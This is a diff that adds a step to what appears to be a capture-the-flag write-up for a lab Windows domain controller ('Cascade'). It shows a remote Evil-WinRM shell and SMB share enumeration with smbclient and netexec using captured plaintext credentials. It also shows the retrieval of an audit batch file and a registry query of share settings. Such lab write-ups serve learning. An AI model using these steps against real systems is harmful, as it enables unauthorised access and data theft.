@@ -355,3 +355,58 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\s.smith\Documents> cat ..\Desktop\user.txt
 3ada386a71ef4ab7b28e28765da00829
 ```
+
+
+## STEP 4
+```sh
+└─$ smbclient -U 'cascade.local/s.smith%sT333ve2' -c 'recurse ON; dir' //10.129.195.221/Audit$
+  .                                   D        0  Wed Jan 29 13:01:26 2020
+  ..                                  D        0  Wed Jan 29 13:01:26 2020
+  CascAudit.exe                      An    13312  Tue Jan 28 16:46:51 2020
+  CascCrypto.dll                     An    12288  Wed Jan 29 13:00:20 2020
+  DB                                  D        0  Tue Jan 28 16:40:59 2020
+  RunAudit.bat                        A       45  Tue Jan 28 18:29:47 2020
+  System.Data.SQLite.dll              A   363520  Sun Oct 27 02:38:36 2019
+  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 02:38:38 2019
+  x64                                 D        0  Sun Jan 26 17:25:27 2020
+  x86                                 D        0  Sun Jan 26 17:25:27 2020
+
+\DB
+  .                                   D        0  Tue Jan 28 16:40:59 2020
+  ..                                  D        0  Tue Jan 28 16:40:59 2020
+  Audit.db                           An    24576  Tue Jan 28 16:39:24 2020
+
+\x64
+  .                                   D        0  Sun Jan 26 17:25:27 2020
+  ..                                  D        0  Sun Jan 26 17:25:27 2020
+  SQLite.Interop.dll                  A  1639936  Sun Oct 27 02:39:20 2019
+
+\x86
+  .                                   D        0  Sun Jan 26 17:25:27 2020
+  ..                                  D        0  Sun Jan 26 17:25:27 2020
+  SQLite.Interop.dll                  A  1246720  Sun Oct 27 02:34:20 2019
+
+                6553343 blocks of size 4096. 1664656 blocks available
+```
+```sh
+└─$ netexec smb 10.129.195.221 -u s.smith -p sT333ve2 --share Audit$ --get-file 'RunAudit.bat' '/home/kali/RunAudit.bat'
+SMB         10.129.195.221  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) 
+SMB         10.129.195.221  445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
+SMB         10.129.195.221  445    CASC-DC1         [*] Copying "RunAudit.bat" to "/home/kali/RunAudit.bat"
+SMB         10.129.195.221  445    CASC-DC1         [+] File "RunAudit.bat" was downloaded to "/home/kali/RunAudit.bat"
+                                                                                                                                                                                
+└─$ cat ../RunAudit.bat                                            
+CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
+```
+```sh
+*Evil-WinRM* PS C:\Users\s.smith\Documents> reg query "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Shares"
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Shares
+    print$    REG_MULTI_SZ    CSCFlags=768\0MaxUses=4294967295\0Path=C:\Windows\system32\spool\drivers\0Permissions=0\0Remark=Printer Drivers\0ShareName=print$\0Type=0
+    SYSVOL    REG_MULTI_SZ    CSCFlags=4352\0MaxUses=4294967295\0Path=C:\Windows\SYSVOL\sysvol\0Permissions=0\0Remark=Logon server share \0ShareName=SYSVOL\0Type=0
+    NETLOGON    REG_MULTI_SZ    CSCFlags=4352\0MaxUses=4294967295\0Path=C:\Windows\SYSVOL\sysvol\cascade.local\SCRIPTS\0Permissions=0\0Remark=Logon server share \0ShareName=NETLOGON\0Type=0
+    Data    REG_MULTI_SZ    CSCFlags=0\0MaxUses=4294967295\0Path=C:\Shares\Data\0Permissions=9\0ShareName=Data\0Type=0
+    Audit$    REG_MULTI_SZ    CSCFlags=0\0MaxUses=4294967295\0Path=C:\Shares\Audit\0Permissions=9\0ShareName=Audit$\0Type=0
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Shares\Security
+```
